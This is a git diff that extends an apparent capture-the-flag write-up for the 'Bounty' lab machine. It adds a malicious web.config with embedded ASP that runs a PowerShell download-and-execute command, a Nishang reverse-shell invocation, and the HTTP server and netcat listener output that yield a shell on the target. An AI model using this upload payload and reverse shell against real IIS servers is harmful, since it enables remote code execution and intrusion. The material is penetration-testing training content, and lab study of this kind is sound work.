@@ -517,8 +517,75 @@ dir c:\users\administrator\desktop\root.txt
 c:\Windows\Temp>
 ```
 
-Now, we skipped user flag earlier, as it does not seem to be visible in the typical directory. As the file is hidden, Get-ChildItem with -force flag is needed.
+Now, we skipped user flag earlier, as it does not seem to be visible in the typical directory. Thought that I would see it as a root, but seems it is hidden and needs PowerShell to get it visible. As firing up powershell from the cmd hangs up, better to start creating the initial reverse shell through powershell. And for that we use Nishang shell (https://github.com/samratashok/nishang/tree/master/Shells)
 
 ```
+$ cat web.config             
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+    <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<%
+Set obj = CreateObject("WScript.Shell")
+obj.Exec("cmd /c powershell IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.3:4444/Invoke-PowerShellTcp.ps1')")
+%>
+```
+
+As this command only downloads the file to the target host, we need to append the Invoke-PowerShellTcp.ps1 with
 
 ```
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTCP -Reverse -IPAddress 10.10.14.3 -Port 6666
+```
+
+Then setting up the server to fetch the file and listener for reverse shell
+
+```
+$ python -m http.server 4444 
+Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+10.10.10.93 - - [30/Dec/2021 11:44:28] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+
+ nc -nvlp 6666                                                                                                                                                                        1 ⨯
+listening on [any] 6666 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.93] 49160
+Windows PowerShell running as user BOUNTY$ on BOUNTY
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32\inetsrv>whoami
+bounty\merlin
+PS C:\windows\system32\inetsrv> 
+```
+
+Now we have a powershell and can finally see the user flag
+
+```
+PS C:\users\merlin\desktop> dir
+PS C:\users\merlin\desktop> dir -force
+
+
+    Directory: C:\users\merlin\desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       
+-a-h-         5/30/2018  11:32 PM         32 user.txt
+```
+
